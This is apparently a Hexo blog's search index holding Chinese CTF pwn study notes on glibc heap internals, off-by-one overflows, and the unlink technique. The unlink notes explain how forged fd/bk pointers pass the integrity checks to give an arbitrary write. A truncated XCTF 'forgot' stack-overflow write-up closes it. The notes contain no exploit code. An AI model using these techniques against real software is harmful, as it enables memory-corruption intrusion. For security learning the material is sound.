<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/posts/0/</url>
    <content><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><h2 id="1-新建文章"><a href="#1-新建文章" class="headerlink" title="1 新建文章"></a>1 新建文章</h2><p>以hello world为例，在hexo目录下命令行输入<code>hexo new &quot;hello_world&quot;</code>，然后会在source的_posts目录下生成一个hello_world.md文件,在该markdown文件中就可以编辑这篇文章的内容了。编辑完成后刷新博客，博客里便会出现这篇文章，同时hexo也会直接为这篇文章生成一个页面。</p>
<h2 id="2-新建草稿"><a href="#2-新建草稿" class="headerlink" title="2 新建草稿"></a>2 新建草稿</h2><p>hexo默认配置是新建文章，所以如果需要新建一篇草稿，需要输入<code>hexo new draft &quot;文章名称&quot;</code>，然后再source的目录下会生成一个_drafts文件夹，里面会有所有新建的草稿，如果想要预览草稿，可以输入<code>hexo server --draft</code>命令来预览草稿文件</p>
<p>当草稿完成以后，可以通过输入<code>hexo publish &quot;文章名称&quot;</code>来发布草稿，然后这篇草稿会从_drafts中被删除，出现在_posts目录下。</p>
<h2 id="3-删除文章"><a href="#3-删除文章" class="headerlink" title="3 删除文章"></a>3 删除文章</h2><p>删除文章十分简单，只需要把_posts目录下需要删除的markdown删除，然后刷新博客之后这篇文章就不会出现在博客中了。</p>
<p>当然还有更多的教程可以直接去<a href="https://hexo.io/zh-cn/docs/writing.html">官网</a>学习。</p>
]]></content>
  </entry>
  <entry>
    <title>off by one</title>
    <url>/posts/a1c78337/</url>
    <content><![CDATA[<h1 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h1><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。总之，是输入的范围超出申请的缓冲区的大小。</p>
<a id="more"></a>

<p>常见的边界验证不严谨有：</p>
<ul>
<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
<li>字符串操作不合适</li>
</ul>
<p>off by one漏洞可以出现在各种缓冲区中，但ctf中常用于堆的题目。因此，主要是说明堆上的off by one。</p>
<h2 id="利用方向"><a href="#利用方向" class="headerlink" title="利用方向"></a>利用方向</h2><p>根据溢出字节是否可控分为两种情况：</p>
<ul>
<li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li>
<li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li>
</ul>
<p>这里的0x100是一个例子，原理是，申请chunk时对于申请大小不是2*size_sz的会自动补全，同时对于正在使用的chunk来说，<code>prev_size</code>是没有意义的，因此是与前一块chunk共用。</p>
<p>size为0x100，用户申请的大小是0xf8。补到0x100，由于chunk头需要0x10的空间，因此正常情况，用户的输入是可以到下一个chunk 的<code>prev_size</code>的。这时候溢出的null字节<code>\x00</code>会覆盖size的最低字节即 <code>prev_in_use</code>。</p>
<p>一个简单实验说明chunk的实际size大小。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">56</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">48</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a1c78337/image-20201116122936249.png" alt="image-20201116122936249"></p>
<p>无论是哪种情况，off by one本身很难实现攻击，一般只是为之后的攻击创造条件。</p>
<p>如实现堆交叉之后的UAF、修改<code>prev_in_use</code>之后使用unlink等。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>offbyone</tag>
      </tags>
  </entry>
  <entry>
    <title>unlink原理</title>
    <url>/posts/c61eeb38/</url>
    <content><![CDATA[<h1 id="unlink-原理"><a href="#unlink-原理" class="headerlink" title="unlink 原理"></a>unlink 原理</h1><p>我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局（伪造chunk等），然后借助 unlink 操作来达成修改指针的效果。</p>
<a id="more"></a>

<h2 id="unlink的过程"><a href="#unlink的过程" class="headerlink" title="unlink的过程"></a>unlink的过程</h2><p>unlink的目的是把一个双向链表中的空闲块拿出来。常用到的是在free当前chunk时，与物理相邻的chunk进行合并为一个大的chunk的情况。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD)                                                     \</span></span><br><span class="line">&#123;                                                                             \</span><br><span class="line">  BK = P-&gt;bk;                                                                 \</span><br><span class="line">  FD = P-&gt;fd;                                                                 \</span><br><span class="line">  FD-&gt;bk = BK;                                                                \</span><br><span class="line">  BK-&gt;fd = FD;                                                                \</span><br><span class="line">&#125;                                                                             \</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>基本过程如图所示：</p>
<p><img src="/posts/c61eeb38/unlink_smallbin_intro.png" alt="img"></p>
<p>结果就是P和BK合并成一块chunk，其chunk头部在BK。</p>
<p>最开始的unlink如上代码所示，是没有进行检查。</p>
<p>而现在的unlink会对chunk 的 size 检查和双向链表检查。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure>

<p>假设在没有检查的情况下，以32位为例子。</p>
<p><img src="/posts/c61eeb38/image-20201116175232943.png" alt="image-20201116175232943"></p>
<p>堆的状态如图，此时free（Q）。</p>
<ul>
<li>glibc 判断这个块是 small chunk</li>
<li>判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li>
<li>判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li>
<li>继而对 Nextchunk 采取 unlink 操作</li>
</ul>
<p>unlink的结果：</p>
<ul>
<li>FD=N-&gt;fd（即FD=a）</li>
<li>BK=N-&gt;bk（BK=b）</li>
<li>FD-&gt;bk = BK（<code>*（a+4*3）=b</code>）</li>
<li>BK-&gt;fd = FD（<code>*(b+4*2)=a</code>）</li>
</ul>
<p>如果能够修改N的fd和bk，如果将fd修改为目标地址-12（如某got）bk修改为期望的值（如另一个地址）。那么执通过FD-&gt;bk = BK就能做到修改目标地址的值的目的。</p>
<h3 id="绕过检查"><a href="#绕过检查" class="headerlink" title="绕过检查"></a>绕过检查</h3><p>但是由于会检查fd和bk指针，上述的修改方法就不成立了，使用伪造的方法。</p>
<p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要</p>
<ul>
<li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li>
<li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li>
</ul>
<p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p>
<ul>
<li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li>
<li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li>
</ul>
<p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向P的指针，那么：</p>
<ul>
<li><code>*P = P - 8</code></li>
<li><code>*P = P - 12</code></li>
</ul>
<p>最终将p指针指向了比自己低12位的地址。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>条件：</p>
<ul>
<li><p>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</p>
</li>
<li><p>已知位置存在一个指针指向可进行 UAF 的 chunk（通常是一个存储申请chunk的数组）</p>
</li>
</ul>
<p>条件并不绝对，也可以是通过溢出修改下一个chunk的prev_in_use、prev_size，unlink前一个伪造的chunk。</p>
<p>本质上，是将准备的free的chunk的物理相邻的free的chunk的fd、bk指针修改。</p>
<p>有了上述条件之后，那么就可以修改数组内容，如果有类似修改chunk内容的函数，就可以做到任意地址写。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>unlink练习</title>
    <url>/posts/6cd531ad/</url>
    <content><![CDATA[<h1 id="unlink练习"><a href="#unlink练习" class="headerlink" title="unlink练习"></a>unlink练习</h1><p>记录ctf-wiki上的unlink练习题。</p>
<a id="more"></a>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>堆基础</title>
    <url>/posts/463ab4ed/</url>
    <content><![CDATA[<h1 id="堆基础知识"><a href="#堆基础知识" class="headerlink" title="堆基础知识"></a>堆基础知识</h1><p>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。一般称管理堆的那部分程序为堆管理器。不同操作系统对于堆的管理方式不尽相同，以下为ctf比赛中常用的Linux的堆基础知识。</p>
<a id="more"></a>

<h2 id="堆管理的基本结构"><a href="#堆管理的基本结构" class="headerlink" title="堆管理的基本结构"></a>堆管理的基本结构</h2><p>堆的管理主要涉及两个，堆表和堆块。堆区（heap）的内存都以堆块为单位进行分配存储，堆块有堆身和堆首，堆首记录堆块的信息，如大小、是否空闲等，堆身存储数据。堆表一般位于堆区的开始，用于存储所有堆块的重要信息，如大小、是否可用、位置等。</p>
<h3 id="堆块"><a href="#堆块" class="headerlink" title="堆块"></a>堆块</h3><p>在glibc中，堆管理器为<strong>ptmalloc2</strong>。申请堆使用函数malloc,将由malloc申请的内存称为chunk</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span></span><br><span class="line"><span class="comment">  if no space is available. Additionally, on failure, errno is</span></span><br><span class="line"><span class="comment">  set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span></span><br><span class="line"><span class="comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span></span><br><span class="line"><span class="comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span></span><br><span class="line"><span class="comment">  with negative arguments are interpreted as requests for huge amounts</span></span><br><span class="line"><span class="comment">  of space, which will often fail. The maximum supported value of n</span></span><br><span class="line"><span class="comment">  differs across systems, but is in all cases less than the maximum</span></span><br><span class="line"><span class="comment">  representable value of a size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>



<p>malloc函数返回对应申请的大小字节的内存块的指针（不包括chunk头）。同时还有异常处理：</p>
<ul>
<li>当 n=0 时，返回当前系统允许的堆的最小内存块。</li>
<li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li>
</ul>
<p>另外，malloc调用时输入的n是用户空间大小，即是堆身大小。</p>
<p>chunk的结构都是统一的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/463ab4ed/RlseGG7.png"></p>
<p>关于INTERNAL_SIZE_T的说明:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* INTERNAL_SIZE_T is the word-size used for internal bookkeeping of</span></span><br><span class="line"><span class="comment">   chunk sizes.</span></span><br><span class="line"><span class="comment">   The default version is the same as size_t.</span></span><br><span class="line"><span class="comment">   While not strictly necessary, it is best to define this as an</span></span><br><span class="line"><span class="comment">   unsigned type, even if size_t is a signed type. This may avoid some</span></span><br><span class="line"><span class="comment">   artificial size limitations on some systems.</span></span><br><span class="line"><span class="comment">   On a 64-bit machine, you may be able to reduce malloc overhead by</span></span><br><span class="line"><span class="comment">   defining INTERNAL_SIZE_T to be a 32 bit `unsigned int&#x27; at the</span></span><br><span class="line"><span class="comment">   expense of not being able to handle more than 2^32 of malloced</span></span><br><span class="line"><span class="comment">   space. If this limitation is acceptable, you are encouraged to set</span></span><br><span class="line"><span class="comment">   this unless you are on a platform requiring 16byte alignments. In</span></span><br><span class="line"><span class="comment">   this case the alignment requirements turn out to negate any</span></span><br><span class="line"><span class="comment">   potential advantages of decreasing size_t word size.</span></span><br><span class="line"><span class="comment">   Implementors: Beware of the possible combinations of:</span></span><br><span class="line"><span class="comment">     - INTERNAL_SIZE_T might be signed or unsigned, might be 32 or 64 bits,</span></span><br><span class="line"><span class="comment">       and might be the same width as int or as long</span></span><br><span class="line"><span class="comment">     - size_t might have different width and signedness as INTERNAL_SIZE_T</span></span><br><span class="line"><span class="comment">     - int and long might be 32 or 64 bits, and might be the same width</span></span><br><span class="line"><span class="comment">   To deal with this, most comparisons and difference computations</span></span><br><span class="line"><span class="comment">   among INTERNAL_SIZE_Ts should cast them to unsigned long, being</span></span><br><span class="line"><span class="comment">   aware of the fact that casting an unsigned int to a wider long does</span></span><br><span class="line"><span class="comment">   not sign-extend. (This also makes checking for negative numbers</span></span><br><span class="line"><span class="comment">   awkward.) Some of these casts result in harmless compiler warnings</span></span><br><span class="line"><span class="comment">   on some systems.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INTERNAL_SIZE_T</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> INTERNAL_SIZE_T size_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding word size.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_SZ (sizeof (INTERNAL_SIZE_T))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding bit mask value.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1)</span></span><br></pre></td></tr></table></figure>

<p>因此，一般为64位的无符整数或32位的</p>
<ul>
<li> prev_size 前一个（物理相邻，较低地址的chunk）的大小，free时有用。包括了chunk头。</li>
<li>size当前chunk的大小，一定是2*size_sz的整数倍，因此最后3位的值对于大小没有影响，从高到低分别表示<ul>
<li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1表示不属于，0表示属于</li>
<li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的</li>
<li>PREV_INUSE，记录前一个 chunk 块是否被分配。1为被分配，每个chunk创建时都默认置1,为0时表示空闲。</li>
</ul>
</li>
<li><strong>fd，bk</strong>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下:<ul>
<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>
<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>
<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li>
</ul>
</li>
<li><strong>fd_nextsize， bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul>
<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适chunk 时挨个遍历。</strong></li>
</ul>
</li>
</ul>
<p><strong>一般情况下</strong>，<strong>物理相邻</strong>的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。（unlink）</p>
<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>释放的chunk不会马上归还给系统，ptmalloc会回收统一管理，当之后用户在申请内存时，就会先在这些回收的chunk中尽量找合适的给用户。以避免频繁的系统调用，降低开销。</p>
<p>ptmalloc根据chunk的大小分为4类：fast bins、small bins、large bins、unsorted bin。在每个类中大小相似的会用链表连接起来。</p>
<p><img src="https://img-blog.csdnimg.cn/20190724161429389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>对于 small bins，large bins，unsorted bin 来说，ptmalloc 将它们维护在同一个数组中。这些bin对应的数据结构在 malloc_state 中，如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="keyword">int</span> flags;   <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[ BINMAPSIZE ];    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span>    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意： malloc_state不在堆段，而是一个全局变量存在数据段中</p>
<p>数组中的 bin 依次如下</p>
<ol>
<li>第一个为 unsorted bin，字如其面，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。</li>
<li>索引从 2 到 63 的 bin 称为 small bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为<strong>2个机器字长</strong>，即32位相差8字节，64位相差16字节。</li>
<li>small bins 后面的 bin 被称作 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的chunk 按 fd 指针的顺序从大到小排列。相同大小的chunk同样按照最近使用顺序排列。</li>
</ol>
<p>此外，上述这些bin的排布都会遵循一个原则：<strong>任意两个物理相邻的空闲chunk不能在一起</strong></p>
<h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><p>对于一些小的chunk释放后<strong>优先</strong>放到fast bin中，为了避免小的chunk和相邻空闲chunk合并，下一次再申请需要堆chunk进行分割的情况。</p>
<p>fastbin所包含chunk的大小为16 Bytes, 24 Bytes, 32 Bytes, … , 80 Bytes。当分配一块较小的内存(mem&lt;=64 Bytes)时，会首先检查对应大小的fastbin中是否包含未被使用的chunk，如果存在则直接将其从fastbin中移除并返回；否则通过其他方式（剪切top chunk）得到一块符合大小要求的chunk并返回。</p>
<p><img src="https://i.imgur.com/KYQmNPN.png" alt="img"></p>
<p>如图所示fastbin的特性有：</p>
<ul>
<li>用单链表维护释放的堆块</li>
<li>链表采用先进后出的方式，最近释放的 chunk 会更早地被分配，所以会更加适合于局部性。</li>
<li>不会对free的chunk进行合并。</li>
</ul>
<h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>mall bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下</p>
<table>
<thead>
<tr>
<th>下标</th>
<th align="center">SIZE_SZ=4（32位）</th>
<th align="center">SIZE_SZ=8（64位）</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td align="center">16</td>
<td align="center">32</td>
</tr>
<tr>
<td>3</td>
<td align="center">24</td>
<td align="center">48</td>
</tr>
<tr>
<td>4</td>
<td align="center">32</td>
<td align="center">64</td>
</tr>
<tr>
<td>……</td>
<td align="center">……</td>
<td align="center">……</td>
</tr>
<tr>
<td>63</td>
<td align="center">504</td>
<td align="center">1008</td>
</tr>
</tbody></table>
<p>small bin的特性：</p>
<ul>
<li>采用循环双向链表</li>
<li>采用FIFO</li>
<li>small的free比较特殊。当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，最后将新的chunk添加到unsorted bin中，之后unsorted bin进行整理再添加到对应的bin链上。</li>
<li>与fast bin大小重合的部分，是有可能放入fast bin中的chunk的。</li>
</ul>
<h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：</p>
<table>
<thead>
<tr>
<th align="left">组</th>
<th align="center">数量</th>
<th align="center">公差</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="center">32</td>
<td align="center">64B</td>
</tr>
<tr>
<td align="left">2</td>
<td align="center">16</td>
<td align="center">512B</td>
</tr>
<tr>
<td align="left">3</td>
<td align="center">8</td>
<td align="center">4096B</td>
</tr>
<tr>
<td align="left">4</td>
<td align="center">4</td>
<td align="center">32768B</td>
</tr>
<tr>
<td align="left">5</td>
<td align="center">2</td>
<td align="center">262144B</td>
</tr>
<tr>
<td align="left">6</td>
<td align="center">1</td>
<td align="center">不限制</td>
</tr>
</tbody></table>
<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>unsorted bin 可以视为空闲 chunk 回归其所属 bin 之前的缓冲区。</p>
<p>unsorted bin中的chunk处于乱序状态。</p>
<p>当 fast bin、small bin 中的 chunk 都不能满足用户请求 chunk 大小时，堆管理器就会考虑使用 unsorted bin 。它会在分配 large chunk 之前对堆中碎片 chunk 进行合并，以便减少堆中的碎片。</p>
<p>特性：</p>
<ul>
<li>unsorted bin是一个由free chunks组成的循环双链表</li>
<li>在unsorted bin中，对chunk的大小并没有限制，任何大小的chunk都可以归属到unsorted bin中</li>
<li>unsortedbin采用的遍历顺序是FIFO</li>
</ul>
<h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的top chunk 就是处于当前堆的物理地址最高的 chunk。这个 chunk 不属于任何一个 bin，它的作用在于当所有的bin 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对heap进行扩展后再进行分配。在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。</p>
<p>需要注意的是，top chunk 的 prev_inuse 比特位始终为1，否则其前面的chunk就会被合并到top chunk中。</p>
<h2 id="相关系统调用"><a href="#相关系统调用" class="headerlink" title="相关系统调用"></a>相关系统调用</h2><p>malloc、free函数背后的系统调用主要是(s)brk、mmap、munmap函数。</p>
<p><img src="/posts/463ab4ed/brk&mmap.png" alt="img"></p>
<h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk 的大小来向操作系统申请内存。</p>
<p>brk和sbrk是在Unix和类Unix操作系统中使用的基本内存管理系统调用，用于控制分配给进程数据段的内存量。</p>
<p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启ASLR，两者的具体位置会有所不同</p>
<ul>
<li>不开启ASLR：start_brk 以及 brk 会指向 data/bss 段的结尾。</li>
<li>开启ASLR：start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li>
</ul>
<p><img src="/posts/463ab4ed/program_virtual_address_memory_space.png" alt="img"></p>
<h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>malloc 会使用 mmap来创建独立的匿名映射段。匿名映射的目的主要是可以申请以0填充的内存，并且这块内存仅被调用进程所使用。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界pwn进阶</title>
    <url>/posts/5600bec/</url>
    <content><![CDATA[<h1 id="攻防世界——pwn进阶"><a href="#攻防世界——pwn进阶" class="headerlink" title="攻防世界——pwn进阶"></a>攻防世界——pwn进阶</h1><p>攻防世界的pwn进阶题目的记录</p>
<a id="more"></a>

<h2 id="三分题"><a href="#三分题" class="headerlink" title="三分题"></a>三分题</h2><h3 id="1-forgot"><a href="#1-forgot" class="headerlink" title="1. forgot"></a>1. forgot</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180827121.png" alt="image-20201220180827121"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091450390.png" alt="image-20201216091450390"></p>
<p><strong>考察知识点：栈溢出</strong></p>
<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091522087.png" alt="image-20201216091522087"></p>
<p>发现scanf是一个溢出点，没有限制输入的大小。</p>
